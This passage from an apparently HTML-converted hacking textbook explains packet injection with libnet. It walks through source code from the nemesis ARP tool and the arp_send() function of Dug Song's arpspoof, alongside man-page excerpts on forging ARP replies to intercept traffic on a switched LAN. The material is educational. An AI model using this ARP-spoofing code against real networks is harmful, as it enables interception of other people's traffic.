libnet_auth_hdr AUTHhdr; typedef struct libnet_dbd_hdr DBDhdr;</p><p class="s31" style="padding-top: 2pt;padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">typedef struct libnet_dns_hdr DNShdr; <b>typedef struct libnet_ethernet_hdr ETHERhdr; </b>typedef struct libnet_icmp_hdr ICMPhdr; typedef struct libnet_igmp_hdr IGMPhdr; typedef struct libnet_ip_hdr IPhdr;</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_737.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">The <span class="s31">nemesis_arp() </span>function calls a series of other functions from this file: <span class="s31">arp_initdata()</span>, <span class="s31">arp_cmdline()</span>, <span class="s31">arp_validatedata()</span>, and <span class="s31">arp_verbose()</span>. You can probably guess that these functions initialize data, process command-line argu- ments, validate data, and do some sort of verbose reporting. The <span class="s31">arp_initdata() </span>function does exactly this, initializing values in statically declared data structures.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">The <span class="s31">arp_initdata() </span>function, shown below, sets various elements of the header structures to the appropriate values for an ARP packet.</p><p class="s40" style="padding-top: 9pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">From nemesis-arp.c</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_738.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">static void arp_initdata(void)</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">{</p><p class="s31" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">/* defaults */</p><p class="s31" style="padding-left: 108pt;text-indent: 0pt;line-height: 107%;text-align: left;">etherhdr.ether_type = ETHERTYPE_ARP; /* Ethernet type ARP */ memset(etherhdr.ether_shost, 0, 6);  /* Ethernet source address */ memset(etherhdr.ether_dhost, 0xff, 6); /* Ethernet destination address */ arphdr.ar_op = ARPOP_REQUEST;    /* ARP opcode: request */ arphdr.ar_hrd = ARPHRD_ETHER;    /* hardware format: Ethernet */ arphdr.ar_pro = ETHERTYPE_IP;    /* protocol format: IP */ arphdr.ar_hln = 6;        /* 6 byte hardware addresses */</p><p class="s31" style="padding-left: 108pt;text-indent: 0pt;line-height: 107%;text-align: left;">arphdr.ar_pln = 4;          /* 4 byte protocol addresses */ memset(arphdr.ar_sha, 0, 6);     /* ARP frame sender address */ memset(arphdr.ar_spa, 0, 4);     /* ARP sender protocol (IP) addr */ memset(arphdr.ar_tha, 0, 6);     /* ARP frame target address */ memset(arphdr.ar_tpa, 0, 4);     /* ARP target protocol (IP) addr */ pd.file_mem = NULL;</p><p class="s31" style="padding-left: 108pt;text-indent: 0pt;line-height: 107%;text-align: left;">pd.file_s = 0; return;</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">}</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_739.png"/></span></p><p style="padding-top: 6pt;padding-left: 109pt;text-indent: 0pt;text-align: left;">Finally, the <span class="s31">nemesis_arp() </span>function calls the function <span class="s31">buildarp() </span>with</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">pointers to the header data structures. Judging from the way the return value from <span class="s31">buildarp() </span>is handled here, <span class="s31">buildarp() </span>builds the packet and injects it. This function is found in yet another source file, nemesis-proto_arp.c.</p><p class="s40" style="padding-top: 9pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">From nemesis-proto_arp.c</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_740.png"/></span></p><p class="s31" style="padding-left: 125pt;text-indent: -34pt;line-height: 107%;text-align: left;">int buildarp(ETHERhdr *eth, ARPhdr *arp, FileData *pd, char *device, int reply)</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">{</p><p class="s31" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">int n = 0;</p><p class="s31" style="padding-left: 108pt;text-indent: 0pt;line-height: 107%;text-align: left;">u_int32_t arp_packetlen; static u_int8_t *pkt;</p><p class="s31" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">struct libnet_link_int *l2 = NULL;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">/* validation tests */</p><p class="s31" style="padding-top: 2pt;padding-left: 125pt;text-indent: -17pt;text-align: left;">if (pd-&gt;file_mem == NULL) pd-&gt;file_s = 0;</p><p class="s31" style="padding-top: 1pt;padding-left: 91pt;text-indent: 17pt;line-height: 21pt;text-align: left;">arp_packetlen = LIBNET_ARP_H + LIBNET_ETH_H + pd-&gt;file_s; #ifdef DEBUG</p><p class="s31" style="padding-left: 108pt;text-indent: 0pt;line-height: 8pt;text-align: left;">printf(&quot;DEBUG: ARP packet length %u.\n&quot;, arp_packetlen);</p><p class="s31" style="padding-left: 91pt;text-indent: 17pt;line-height: 107%;text-align: left;">printf(&quot;DEBUG: ARP payload size %u.\n&quot;, pd-&gt;file_s); #endif</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">if ((l2 = <b>libnet_open_link_interface(device, errbuf)</b>) == NULL)</p><p class="s31" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">{</p><p class="s31" style="padding-left: 125pt;text-indent: 0pt;text-align: left;">nemesis_device_failure(INJECTION_LINK, (const char *)device); return -1;</p><p class="s31" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">}</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">if <b>(libnet_init_packet(arp_packetlen, &amp;pkt) </b>== -1)</p><p class="s31" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">{</p><p class="s31" style="padding-left: 125pt;text-indent: 0pt;line-height: 107%;text-align: left;">fprintf(stderr, &quot;ERROR: Unable to allocate packet memory.\n&quot;); return -1;</p><p class="s31" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">}</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s46" style="padding-top: 4pt;padding-left: 142pt;text-indent: -34pt;line-height: 107%;text-align: left;">libnet_build_ethernet(eth-&gt;ether_dhost, eth-&gt;ether_shost, eth-&gt;ether_type, NULL, 0, pkt);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s46" style="padding-left: 142pt;text-indent: -34pt;line-height: 107%;text-align: left;">libnet_build_arp(arp-&gt;ar_hrd, arp-&gt;ar_pro, arp-&gt;ar_hln, arp-&gt;ar_pln, arp-&gt;ar_op, arp-&gt;ar_sha, arp-&gt;ar_spa, arp-&gt;ar_tha, arp-&gt;ar_tpa, pd-&gt;file_mem, pd-&gt;file_s, pkt + LIBNET_ETH_H);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s46" style="padding-left: 159pt;text-indent: -50pt;line-height: 107%;text-align: left;">n = libnet_write_link_layer(l2, device, pkt, LIBNET_ETH_H + LIBNET_ARP_H + pd-&gt;file_s);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">if (verbose == 2)</p><p class="s31" style="padding-left: 108pt;text-indent: 17pt;line-height: 107%;text-align: left;">nemesis_hexdump(pkt, arp_packetlen, HEX_ASCII_DECODE); if (verbose == 3)</p><p class="s31" style="padding-left: 125pt;text-indent: 0pt;text-align: left;">nemesis_hexdump(pkt, arp_packetlen, HEX_RAW_DECODE);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">if (n != arp_packetlen)</p><p class="s31" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">{</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">}</p><p class="s31" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">else</p><p class="s31" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">{</p><p class="s31" style="padding-left: 31pt;text-indent: -31pt;line-height: 107%;text-align: left;">fprintf(stderr, &quot;ERROR: Incomplete packet injection. Only &quot; &quot;wrote %d bytes.\n&quot;, n);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="text-indent: 0pt;text-align: left;">if (verbose)</p><p class="s31" style="text-indent: 0pt;text-align: left;">{</p><p class="s31" style="padding-left: 142pt;text-indent: 0pt;text-align: left;">if (memcmp(eth-&gt;ether_dhost, (void *)&amp;one, 6))</p><p class="s31" style="padding-left: 142pt;text-indent: 0pt;text-align: left;">{</p><p class="s31" style="padding-left: 193pt;text-indent: -34pt;text-align: left;">printf(&quot;Wrote %d byte unicast ARP request packet through &quot; &quot;linktype %s.\n&quot;, n,</p><p class="s31" style="padding-left: 193pt;text-indent: 0pt;text-align: left;">nemesis_lookup_linktype(l2-&gt;linktype));</p><p class="s31" style="padding-left: 142pt;text-indent: 0pt;text-align: left;">}</p><p class="s31" style="padding-left: 142pt;text-indent: 0pt;text-align: left;">else</p><p class="s31" style="padding-left: 142pt;text-indent: 0pt;text-align: left;">{</p><p class="s31" style="padding-left: 159pt;text-indent: 0pt;text-align: left;">printf(&quot;Wrote %d byte %s packet through linktype %s.\n&quot;, n,</p><p class="s31" style="padding-top: 2pt;padding-left: 193pt;text-indent: 0pt;text-align: left;">(eth-&gt;ether_type == ETHERTYPE_ARP ? &quot;ARP&quot; : &quot;RARP&quot;), nemesis_lookup_linktype(l2-&gt;linktype));</p><p class="s31" style="padding-left: 142pt;text-indent: 0pt;text-align: left;">}</p><p class="s31" style="padding-left: 125pt;text-indent: 0pt;text-align: left;">}</p><p class="s31" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">}</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s46" style="padding-top: 4pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">libnet_destroy_packet(&amp;pkt);</p><p class="s31" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">if (l2 != NULL)</p><p class="s46" style="padding-left: 125pt;text-indent: 0pt;text-align: left;">libnet_close_link_interface(l2);</p><p class="s31" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">return (n);</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">}</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_741.png"/></span></p><p style="padding-top: 8pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">At a high level, this function should be readable to you. Using libnet functions, it opens a link interface and initializes memory for a packet. Then, it builds the Ethernet layer using elements from the Ethernet header data structure and then does the same for the ARP layer. Next, it writes the packet to the device to inject it, and finally cleans up by destroying the packet and closing the interface. The documentation for these functions from the libnet man page is shown below for clarity.</p><p class="s40" style="padding-top: 9pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">From the libnet Man Page</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_742.png"/></span></p><p class="s46" style="padding-top: 1pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">libnet_open_link_interface() <span class="s31">opens a low-level packet interface. This is required to write link layer frames. Supplied is a u_char pointer to the interface device name and a u_char pointer to an error buffer. Returned is a filled in libnet_link_int struct or NULL on error.</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s46" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">libnet_init_packet() <span class="s31">initializes a packet for use. If the size parameter is omitted (or negative) the library will pick a reasonable value for the user (currently LIBNET_MAX_PACKET). If the memory allocation is successful, the memory is zeroed and the function returns 1. If there is an error, the function returns -1. Since this function calls malloc, you certainly should, at some point, make a corresponding call to destroy_packet().</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s46" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">libnet_build_ethernet() <span class="s31">constructs an ethernet packet. Supplied is the destination address, source address (as arrays of unsigned characterbytes) and the ethernet frame type, a pointer to an optional data payload, the payload length, and a pointer to a pre-allocated block of memory for the packet. The ethernet packet type should be one of the following:</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">Value       Type</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">ETHERTYPE_PUP   PUP protocol</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">ETHERTYPE_IP   IP protocol</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">ETHERTYPE_ARP   ARP protocol ETHERTYPE_REVARP  Reverse ARP protocol ETHERTYPE_VLAN   IEEE VLAN tagging</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">ETHERTYPE_LOOPBACK Used to test interfaces</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s46" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">libnet_build_arp() <span class="s31">constructs an ARP (Address Resolution Protocol) packet. Supplied are the following: hardware address type, protocol address type, the hardware address length, the protocol address length, the ARP packet type, the sender hardware address, the sender protocol address, the target hardware address, the target protocol address, the packet payload, the payload size, and finally, a pointer to the packet header memory. Note that this function</span></p><p class="s31" style="padding-top: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">only builds ethernet/IP ARP packets, and consequently the first value should be ARPHRD_ETHER. The ARP packet type should be one of the following: ARPOP_REQUEST, ARPOP_REPLY, ARPOP_REVREQUEST, ARPOP_REVREPLY, ARPOP_INVREQUEST, or ARPOP_INVREPLY.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s46" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">libnet_destroy_packet() <span class="s31">frees the memory associated with the packet.</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s46" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">libnet_close_link_interface() <span class="s31">closes an opened low-level packet interface. Returned is 1 upon success or -1 on error.</span></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_743.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">With a basic understanding of C, API documentation, and common sense, you can teach yourself just by examining open source projects. For example, Dug Song provides a program called arpspoof, included with dsniff, that per- forms the ARP redirection attack.</p><p class="s40" style="padding-top: 9pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">From the arpspoof Man Page</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_744.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">NAME</p><p class="s31" style="padding-left: 11pt;text-indent: 0pt;text-align: center;">arpspoof - intercept packets on a switched LAN</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">SYNOPSIS</p><p class="s31" style="padding-left: 121pt;text-indent: 0pt;text-align: left;">arpspoof [-i interface] [-t target] host</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">DESCRIPTION</p><p class="s31" style="padding-left: 121pt;text-indent: 0pt;line-height: 107%;text-align: left;">arpspoof redirects packets from a target host (or all hosts) on the LAN intended for another host on the LAN by forging ARP replies. This is an extremely effective way of sniffing traffic on a switch.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 121pt;text-indent: 0pt;line-height: 107%;text-align: left;">Kernel IP forwarding (or a userland program which accomplishes the same, e.g. fragrouter(8)) must be turned on ahead of time.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-left: 25pt;text-indent: 0pt;text-align: right;">OPTIONS</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="text-indent: 0pt;text-align: left;">-i interface</p><p class="s31" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">Specify the interface to use.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="text-indent: 0pt;text-align: left;">-t target</p><p class="s31" style="padding-left: 27pt;text-indent: 0pt;line-height: 107%;text-align: left;">Specify a particular host to ARP poison (if not  specified, all hosts on the LAN).</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 27pt;text-indent: -27pt;text-align: left;">host  Specify the host you wish to intercept packets for (usually the local gateway).</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">SEE ALSO</p><p class="s31" style="padding-left: 121pt;text-indent: 0pt;text-align: left;">dsniff(8), fragrouter(8)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">AUTHOR</p><p style="padding-bottom: 3pt;padding-left: 121pt;text-indent: 0pt;text-align: left;"><a href="mailto:dugsong@monkey.org" class="s81" target="_blank">Dug Song &lt;dugsong@monkey.org&gt;</a></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_745.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: justify;">The magic of this program comes from its <span class="s31">arp_send() </span>function, which also uses libnet to spoof packets. The source code for this function should be read- able to you, since many of the previously explained libnet functions are used (shown in bold below). The use of structures and an error buffer should also be familiar.</p><p class="s40" style="padding-top: 4pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">arpspoof.c</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_746.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">static struct libnet_link_int *llif;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">static struct ether_addr spoof_mac, target_mac; static in_addr_t spoof_ip, target_ip;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">...</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">int</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">arp_send(struct libnet_link_int *llif, char *dev,</p><p class="s31" style="padding-left: 40pt;text-indent: 0pt;text-align: left;">int op, u_char *sha, in_addr_t spa, u_char *tha, in_addr_t tpa)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">{</p><p class="s31" style="padding-left: 36pt;text-indent: 0pt;line-height: 107%;text-align: left;">char ebuf[128]; u_char pkt[60];</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">if (sha == NULL &amp;&amp;</p><p class="s31" style="padding-left: 53pt;text-indent: 0pt;line-height: 107%;text-align: left;">(sha = (u_char *)libnet_get_hwaddr(llif, dev, ebuf)) == NULL) { return (-1);</p><p class="s31" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">}</p><p class="s31" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">if (spa == 0) {</p><p class="s31" style="padding-left: 70pt;text-indent: -16pt;line-height: 107%;text-align: left;">if ((spa = libnet_get_ipaddr(llif, dev, ebuf)) == 0) return (-1);</p><p class="s31" style="padding-left: 53pt;text-indent: 0pt;text-align: left;">spa = htonl(spa); /* XXX */</p><p class="s31" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">}</p><p class="s31" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">if (tha == NULL)</p><p class="s31" style="padding-left: 53pt;text-indent: 0pt;text-align: left;">tha = &quot;\xff\xff\xff\xff\xff\xff&quot;;</p><p class="s46" style="padding-top: 2pt;padding-left: 36pt;text-indent: 0pt;line-height: 21pt;text-align: left;">libnet_build_ethernet(tha, sha, ETHERTYPE_ARP, NULL, 0, pkt); libnet_build_arp(ARPHRD_ETHER, ETHERTYPE_IP, ETHER_ADDR_LEN, 4,</p><p class="s46" style="padding-left: 74pt;text-indent: 0pt;line-height: 8pt;text-align: left;">op, sha, (u_char *)&amp;spa, tha, (u_char *)&amp;tpa,</p><p class="s46" style="padding-left: 74pt;text-indent: 0pt;text-align: left;">NULL, 0, pkt + ETH_H);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">fprintf(stderr, &quot;%s &quot;,</p><p class="s31" style="padding-left: 53pt;text-indent: 0pt;text-align: left;">ether_ntoa((struct ether_addr *)sha));</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">if (op == ARPOP_REQUEST) {</p><p class="s31" style="padding-left: 70pt;text-indent: -16pt;line-height: 107%;text-align: left;">fprintf(stderr, &quot;%s 0806 42: arp who-has %s tell %s\n&quot;, ether_ntoa((struct ether_addr *)tha), libnet_host_lookup(tpa, 0),</p><p class="s31" style="padding-left: 70pt;text-indent: 0pt;line-height: 10pt;text-align: left;">libnet_host_lookup(spa, 0));</p><p class="s31" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">}</p><p class="s31" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">else {</p><p class="s31" style="padding-left: 70pt;text-indent: -16pt;line-height: 106%;text-align: left;">fprintf(stderr, &quot;%s 0806 42: arp reply %s is-at &quot;, ether_ntoa((struct ether_addr *)tha), libnet_host_lookup(spa, 0));</p><p class="s31" style="padding-left: 70pt;text-indent: -16pt;line-height: 107%;text-align: left;">fprintf(stderr, &quot;%s\n&quot;, ether_ntoa((struct ether_addr *)sha));</p><p class="s31" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">}</p><p class="s31" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">return (<b>libnet_write_link_layer(llif, dev, pkt, sizeof(pkt)) == sizeof(pkt)</b>);</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">}</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_747.png"/></span></p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">The remaining libnet functions get hardware addresses, get the IP address, and look up hosts. These functions have descriptive names and are explained in detail on the libnet man page.</p><p class="s40" style="padding-top: 9pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">From the libnet Man Page</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_748.png"/></span></p><p class="s46" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">libnet_get_hwaddr() <span class="s31">takes a pointer to a link layer interface struct, a pointer to the network device name, and an empty buffer to be used in case of error. The function returns the MAC address of the specified interface upon success or 0 upon error (and errbuf will contain a reason).</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s46" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">libnet_get_ipaddr() <span class="s31">takes a pointer to a link layer interface struct, a pointer to the network device name, and an empty buffer to be used in case of error. Upon success the function returns the IP address of the specified interface in host-byte order or 0 upon error (and errbuf will contain a reason).</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s46" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">libnet_host_lookup() <span class="s31">converts the supplied network-ordered (big-endian) IPv4 address into its human-readable counterpart. If use_name is 1, libnet_host_lookup() will attempt to resolve this IP address and return a hostname, otherwise (or if the lookup fails), the function returns a dotted- decimal ASCII string.</span></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_749.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Once you’ve learned how to read C code, existing programs can teach you a lot by example. Programming libraries like libnet and libpcap have plenty of documentation that explains all the details you may not be able to divine from the source alone. The goal here is to teach you how to learn from source code, as opposed to just teaching how to use a few libraries. After all, there are many other libraries and a lot of existing source code that uses them.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="toc">&nbsp;</p><div class="toc"><a class="toc0" href="part92.htm">0x450 Denial of Service</a></div><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part90.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part92.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
